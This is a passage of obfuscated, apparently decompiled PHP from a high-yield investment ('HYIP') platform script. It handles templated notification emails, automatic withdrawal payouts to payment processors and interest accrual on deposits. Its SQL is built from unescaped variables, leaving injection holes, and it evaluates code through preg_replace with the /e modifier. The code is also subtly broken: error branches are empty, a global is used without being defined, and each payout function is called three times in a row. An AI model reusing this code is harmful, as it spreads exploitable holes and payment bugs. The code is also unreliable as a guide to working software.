    {
        return chop( $l );
    }
}

function elnlcrsmm( $elnlcmPtia, $elnlcFFsKL, $elnlcfduWm, $elnlcVnhFk )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $q = "select * from hm2_emails where id = '{$elnlcmPtia}'";
    $elnlcRLPe = mysql_query( $q );
    $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
    if ( !$elnlcPSitf )
    {
    }
    else if ( !$elnlcPSitf[$elnlcbhAzL['elnlcdgqQo']] )
    {
    }
    else
    {
        $elnlcBrqu = $elnlcPSitf[$elnlcbhAzL['elnlczSGMs']];
        $elnlcGuBb = $elnlcPSitf[$elnlcbhAzL['elnlcsiEn']];
        $elnlcBeVo = $elnlcPSitf[$elnlcbhAzL['elnlcPQqPz']];
        foreach ( $elnlcVnhFk as $k => $v )
        {
            if ( is_array( $v ) )
            {
                $v = $v[0];
            }
            $elnlcBrqu = preg_replace( "/#{$k}#/", $v, $elnlcBrqu );
            $elnlcBeVo = preg_replace( "/#{$k}#/", $v, $elnlcBeVo );
            if ( $elnlcPSitf[$elnlcbhAzL['elnlcvePb']] )
            {
                $elnlcGuBb = preg_replace( "/#{$k}#/", $v, $elnlcGuBb );
            }
        }
        $elnlcBrqu = preg_replace( "/#site_name#/", $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']], $elnlcBrqu );
        if ( $elnlcPSitf[$elnlcbhAzL['elnlcvePb']] )
        {
            $elnlcGuBb = preg_replace( "/#site_name#/", $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']], $elnlcGuBb );
        }
        $elnlcBeVo = preg_replace( "/#site_name#/", $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']], $elnlcBeVo );
        $elnlcBrqu = preg_replace( "/#site_url#/", $elnlctVnzQ[$elnlcbhAzL['elnlczoWB']], $elnlcBrqu );
        if ( $elnlcPSitf[$elnlcbhAzL['elnlcvePb']] )
        {
            $elnlcGuBb = preg_replace( "/#site_url#/", $elnlctVnzQ[$elnlcbhAzL['elnlczoWB']], $elnlcGuBb );
        }
        $elnlcBeVo = preg_replace( "/#site_url#/", $elnlctVnzQ[$elnlcbhAzL['elnlczoWB']], $elnlcBeVo );
        if ( $elnlcPSitf[$elnlcbhAzL['elnlcvePb']] )
        {
            $elnlcpdjwR = elnlcfiaan( 12 );
            $elnlcBrqu = elnlcnbbg( $elnlcBrqu );
            $elnlcGuBb = elnlcdnvk( $elnlcGuBb );
            $elnlcnQfL = "--{$elnlcpdjwR}\nContent-Type: text/plain;\nContent-Transfer-Encoding: 8bit\n\n{$elnlcBrqu}\n\n--{$elnlcpdjwR}\nContent-Type: text/html;\nContent-transfer-encoding: quoted-printable;\n\n{$elnlcGuBb}\n\n--{$elnlcpdjwR}--";
        }
        else
        {
            $elnlcnQfL = $elnlcBrqu;
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
        {
            $elnlcbeMz = fopen( $elnlcbhAzL['elnlczyTT'], $elnlcbhAzL['elnlcifhc'] );
            fwrite( $elnlcbeMz, "TO: {$elnlcFFsKL}\nFrom: {$elnlcfduWm}\nSubject: {$elnlcBeVo}\n\n{$elnlcBrqu}\n\n" );
            fclose( $elnlcbeMz );
        }
        else
        {
            mail( $elnlcFFsKL, $elnlcBeVo, $elnlcnQfL, "From: {$elnlcfduWm}\nReply-To: {$elnlcfduWm}".( $elnlcPSitf[$elnlcbhAzL['elnlcvePb']] ? "\nContent-Type: multipart/alternative; boundary={$elnlcpdjwR}" : "" ) );
        }
    }
}

function elnlcmrsez( $elnlcUGiiE )
{
    global $elnlcbhAzL;
    $elnlcUGiiE = str_replace( "\r\n", "\n", $elnlcUGiiE );
    $elnlcUGiiE = str_replace( "\r", "\n", $elnlcUGiiE );
    return $elnlcUGiiE;
}

function elnlcnbbg( $elnlcUGiiE )
{
    global $elnlcbhAzL;
    $elnlcrAssr = elnlcmrsez( $elnlcUGiiE );
    if ( substr( $elnlcrAssr, 0 - strlen( "\n" ) ) != "\n" )
    {
        $elnlcrAssr .= "\n";
    }
    return $elnlcrAssr;
}

function elnlcdnvk( $elnlcUGiiE )
{
    global $elnlcbhAzL;
    $elnlcrAssr = elnlcmrsez( $elnlcUGiiE );
    if ( substr( $elnlcrAssr, 0 - strlen( "\n" ) ) != "\n" )
    {
        $elnlcrAssr .= "\n";
    }
    $elnlcrAssr = preg_replace( "/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e", "'='.sprintf('%02X', ord('\\1'))", $elnlcrAssr );
    $elnlcrAssr = preg_replace( "/([\t ])\n/e", "'='.sprintf('%02X', ord('\\1')).'\n'", $elnlcrAssr );
    $elnlcrAssr = elnlcxvnqh( $elnlcrAssr, 74, true );
    return $elnlcrAssr;
}

function elnlcxvnqh( $elnlcNIuC, $elnlcPLfP, $elnlchucH = false )
{
    global $elnlcbhAzL;
    $elnlceIjh = $elnlchucH ? sprintf( " =%s", "\n" ) : "\n";
    $elnlcNIuC = elnlcmrsez( $elnlcNIuC );
    if ( substr( $elnlcNIuC, -1 ) == "\n" )
    {
        $elnlcNIuC = substr( $elnlcNIuC, 0, -1 );
    }
    $elnlcOjknS = explode( "\n", $elnlcNIuC );
    $elnlcNIuC = "";
    $i = 0;
    for ( ; $i < count( $elnlcOjknS ); ++$i )
    {
        $elnlcFLwkf = explode( " ", $elnlcOjknS[$i] );
        $elnlcQGVA = "";
        $e = $elnlcbhAzL['elnlcSFKV'];
        for ( ; $e < count( $elnlcFLwkf ); ++$e )
        {
            $elnlcranRU = $elnlcFLwkf[$e];
            if ( $elnlchucH && $elnlcPLfP < strlen( $elnlcranRU ) )
            {
                $elnlcVKHG = $elnlcPLfP - strlen( $elnlcQGVA ) - 1;
                if ( $e != 0 )
                {
                    if ( 20 < $elnlcVKHG )
                    {
                        $elnlcJdVQH = $elnlcVKHG;
                        if ( substr( $elnlcranRU, $elnlcJdVQH - 1, 1 ) == "=" )
                        {
                            --$elnlcJdVQH;
                        }
                        else if ( substr( $elnlcranRU, $elnlcJdVQH - 2, 1 ) == "=" )
                        {
                            $elnlcJdVQH -= 2;
                        }
                        $elnlcsvyKw = substr( $elnlcranRU, 0, $elnlcJdVQH );
                        $elnlcranRU = substr( $elnlcranRU, $elnlcJdVQH );
                        $elnlcQGVA .= " ".$elnlcsvyKw;
                        $elnlcNIuC .= $elnlcQGVA.sprintf( "=%s", "\n" );
                    }
                    else
                    {
                        $elnlcNIuC .= $elnlcQGVA.$elnlceIjh;
                    }
                    $elnlcQGVA = "";
                }
                if ( 0 < strlen( $elnlcranRU ) )
                {
                    $elnlcJdVQH = $elnlcPLfP;
                    if ( substr( $elnlcranRU, $elnlcJdVQH - 1, 1 ) == "=" )
                    {
                        --$elnlcJdVQH;
                    }
                    else if ( substr( $elnlcranRU, $elnlcJdVQH - 2, 1 ) == "=" )
                    {
                        $elnlcJdVQH -= 2;
                    }
                    $elnlcsvyKw = substr( $elnlcranRU, 0, $elnlcJdVQH );
                    $elnlcranRU = substr( $elnlcranRU, $elnlcJdVQH );
                    if ( 0 < strlen( $elnlcranRU ) )
                    {
                        $elnlcNIuC .= $elnlcsvyKw.sprintf( "=%s", "\n" );
                    }
                    else
                    {
                        $elnlcQGVA = $elnlcsvyKw;
                        continue;
                    }
                }
            }
            else
            {
                $elnlcJPoTz = $elnlcQGVA;
                $elnlcQGVA .= $e == 0 ? $elnlcranRU : " ".$elnlcranRU;
                if ( $elnlcPLfP < strlen( $elnlcQGVA ) && $elnlcJPoTz != "" )
                {
                    $elnlcNIuC .= $elnlcJPoTz.$elnlceIjh;
                    $elnlcQGVA = $elnlcranRU;
                }
            }
        }
        $elnlcNIuC .= $elnlcQGVA."\n";
    }
    return $elnlcNIuC;
}

function elnlckssyo( $elnlcrTjI = "100%" )
{
    return "\r\n<table cellspacing=0 cellpadding=1 border=0 width={$elnlcrTjI} bgcolor=#FF8D00>\r\n<tr><td bgcolor=#FF8D00>\r\n<table cellspacing=0 cellpadding=0 border=0 width=100%>\r\n<tr>\r\n<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>\r\n<td valign=top bgcolor=#FFFFF2 style='padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;'>\r\n";
}

function elnlcaxnh( )
{
    return "</td></tr></table></td></tr></table>";
}

function elnlcyioda( $elnlcqaqH, $elnlcekLao, $elnlctuCBn )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
    }
    else
    {
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcFcsEj']] == 1 )
        {
            $q = "select * from hm2_deposits where id = {$elnlcqaqH}";
            if ( !( $elnlcRLPe = mysql_query( $q ) ) )
            {
            }
            $elnlcnooby = mysql_fetch_array( $elnlcRLPe );
            if ( !$elnlcjxPh[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]][$elnlcbhAzL['elnlcsrNcA']] )
            {
            }
            else
            {
                $q = "select * from hm2_users where id = ".$elnlcnooby[$elnlcbhAzL['elnlcPqCb']];
                if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                {
                }
                $elnlcxqdJl = mysql_fetch_array( $elnlcRLPe );
                if ( $elnlcxqdJl[$elnlcbhAzL['elnlcPFKc']] != 1 || $elnlcxqdJl[$elnlcbhAzL['elnlcDLrc']] != 1 )
                {
                }
                else
                {
                    if ( 0 < $elnlctVnzQ[$elnlcbhAzL['elnlcuolIp']] )
                    {
                        $q = "select sum(actual_amount*(type = 'add_funds')) as td, sum(actual_amount*(type = 'withdrawal')) as tw from hm2_history where type in ('add_funds', 'withdrawal')";
                        if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
                        if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcagbym']] && $elnlctVnzQ[$elnlcbhAzL['elnlcuolIp']] <= ( $elnlcPSitf[$elnlcbhAzL['elnlcyzWW']] + $elnlcekLao ) * 100 / $elnlcPSitf[$elnlcbhAzL['elnlcagbym']] )
                        {
                            return;
                        }
                    }
                    $elnlctQrkJ = unserialize( $elnlcxqdJl[$elnlcbhAzL['elnlcxTfsm']] );
                    $elnlcekLao = abs( $elnlcekLao );
                    $elnlcMKoE = floor( $elnlcekLao * $elnlctVnzQ[$elnlcbhAzL['elnlcCzMiB']] ) / 100;
                    if ( $elnlcMKoE < $elnlctVnzQ[$elnlcbhAzL['elnlcOkFp']] )
                    {
                        $elnlcMKoE = $elnlctVnzQ[$elnlcbhAzL['elnlcOkFp']];
                    }
                    $elnlcDofp = $elnlcekLao - $elnlcMKoE;
                    if ( $elnlcDofp < 0 )
                    {
                        $elnlcDofp = $elnlcbhAzL['elnlcSFKV'];
                    }
                    $elnlcDofp = sprintf( "%.02f", floor( $elnlcDofp * 100 ) / 100 );
                    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcxxOeN']] != "" )
                    {
                        $elnlcKVGaE = "Earning from deposit \$".$elnlcnooby[$elnlcbhAzL['elnlcowtbp']].". Auto withdraw to ".$elnlcxqdJl[$elnlcbhAzL['elnlclrlET']]." from ".$elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']];
                    }
                    else
                    {
                        $elnlcKVGaE = $elnlctVnzQ[$elnlcbhAzL['elnlcxxOeN']];
                    }
                    $elnlcstWo = "Auto-withdrawal error, tried to send {$elnlcDofp} earning to ".$elnlcjxPh[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]][$elnlcbhAzL['elnlcPeWJ']]." account # ".$elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]].". Error:";
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 0 )
                    {
                        $elnlcUqhml = elnlcgdlk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcgdlk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcgdlk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 1 )
                    {
                        $elnlcUqhml = elnlcckaah( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcckaah( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcckaah( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 2 )
                    {
                        $elnlcUqhml = elnlcawoqk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcawoqk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcawoqk( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 5 )
                    {
                        $elnlcUqhml = elnlcfiih( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcfiih( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcfiih( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 8 )
                    {
                        $elnlcUqhml = elnlcxqdc( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcxqdc( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcxqdc( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 9 )
                    {
                        $elnlcUqhml = elnlcjgjcd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcjgjcd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcjgjcd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 15 )
                    {
                        $elnlcUqhml = elnlcfqpp( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcfqpp( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcfqpp( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 16 )
                    {
                        $elnlcUqhml = elnlcrpns( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcrpns( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcrpns( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 17 )
                    {
                        $elnlcUqhml = elnlcjfec( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcjfec( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcjfec( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 18 )
                    {
                        $elnlcUqhml = elnlcwrhd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcwrhd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcwrhd( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlcnooby[$elnlcbhAzL['elnlcLlqz']] == 24 )
                    {
                        $elnlcUqhml = elnlcfhhnb( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[2];
                        $elnlcBrqu = elnlcfhhnb( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[1];
                        $elnlczEnDL = elnlcfhhnb( "", $elnlcDofp, $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]], $elnlcKVGaE, $elnlcstWo )[0];
                    }
                    if ( $elnlczEnDL == 1 )
                    {
                        $q = "insert into hm2_history set\r\n            user_id = ".$elnlcxqdJl[$elnlcbhAzL['elnlcIGomq']].",\r\n        \t\tamount = -{$elnlcekLao},\r\n            \t\tactual_amount = -{$elnlcekLao},\r\n        \t\ttype='withdrawal',\r\n            \t\t{$elnlctuCBn},\r\n\t\t\tec = ".$elnlcnooby[$elnlcbhAzL['elnlcLlqz']].",\r\n        \t\tdescription = 'Auto-withdrawal earning to account ".$elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]].". Batch is {$elnlcUqhml}'";
                        if ( !mysql_query( $q ) )
                        {
                        }
                        $elnlcVnhFk = array( );
                        $elnlcVnhFk[$elnlcbhAzL['elnlclrlET']] = $elnlcxqdJl[$elnlcbhAzL['elnlclrlET']];
                        $elnlcVnhFk[$elnlcbhAzL['elnlcPeWJ']] = $elnlcxqdJl[$elnlcbhAzL['elnlcPeWJ']];
                        $elnlcVnhFk[$elnlcbhAzL['elnlclEcuA']] = $elnlcekLao;
                        $elnlcVnhFk[$elnlcbhAzL['elnlccDio']] = $elnlcUqhml;
                        $elnlcVnhFk[$elnlcbhAzL['elnlcKfiHR']] = $elnlctQrkJ[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]];
                        $elnlcVnhFk[$elnlcbhAzL['elnlclmhFR']] = $elnlcjxPh[$elnlcnooby[$elnlcbhAzL['elnlcLlqz']]][$elnlcbhAzL['elnlcPeWJ']];
                        elnlcrsmm( "withdraw_user_notification", $elnlcxqdJl[$elnlcbhAzL['elnlcRgzM']], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlcVnhFk );
                        elnlcrsmm( "withdraw_admin_notification", $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlcVnhFk );
                    }
                }
            }
        }
    }
}

function elnlcsemuu( $elnlcomuon )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $elnlcySAk = array( );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcbpUa']] == 1 && $elnlcomuon != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlcRLPe = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
        {
            $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcxFqC']]][$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']]] = $elnlcPSitf;
        }
        $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
        $elnlcVDoJN = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlcomuon == -1 )
        {
            $elnlcVDoJN = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcomuon} and status = 'on'";
        }
        if ( $elnlcomuon == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlchwCbb = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcEhri = mysql_fetch_array( $elnlchwCbb ) )
        {
            $elnlcBpRxC = $elnlcEhri[$elnlcbhAzL['elnlcIGomq']];
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcBpRxC}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
            $elnlcohEsp = " ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ";
            while ( 0 < $elnlcbUPoI )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              t.return_profit as return_profit,\r\n              {$elnlcohEsp} as q_days1\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcBpRxC} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              ((({$elnlcohEsp} + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = 'h', 60*60, 60*60*24))) or {$elnlcohEsp} = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              (({$elnlcohEsp} = 0) or \r\n                (               \r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = 'h') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = 'd') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval {$elnlcohEsp} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                ({$elnlcohEsp} > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                {
                }
                $elnlcbUPoI = $elnlcbhAzL['elnlcSFKV'];
                do
                {
                    if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                    {
                        ++$elnlcbUPoI;
                        if ( !isset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            continue;
                        }
                        $elnlcWsKAT = $elnlcbhAzL['elnlcSFKV'];
                        $elnlcitPK = $elnlcbhAzL['elnlcSFKV'];
                        reset( $elnlcySAk );
                        reset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] );
                        $elnlcBsLS = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[1];
                        $elnlchcOIm = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[0];
                        while ( each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            if ( $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] || $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] == 0 ) )
                            {
                                $elnlcWsKAT = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && $elnlcWsKAT == 0 )
                            {
                                $elnlcWsKAT = $elnlcitPK;
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && 0 < $elnlcWsKAT )
                            {
                                break;
                            }
                            $elnlcitPK = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                        }
                        if ( $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] != 0 && $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] < $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] )
                        {
                            $elnlcWsKAT = $elnlcitPK;
                        }
                        $elnlczQGd = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] * $elnlcWsKAT / 100;
                        $elnlcWtdA = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcWjfoP'] )
                        {
                            $elnlcWtdA = " 1 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] )
                        {
                            $elnlcWtdA = " 1 hour ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwsmEy'] )
                        {
                            $elnlcWtdA = " 7 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == "b-w" )
                        {
                            $elnlcWtdA = " 14 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwRWaa'] )
                        {
                            $elnlcWtdA = " 1 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlccrvf'] )
                        {
                            $elnlcWtdA = " 2 month ";
                        }
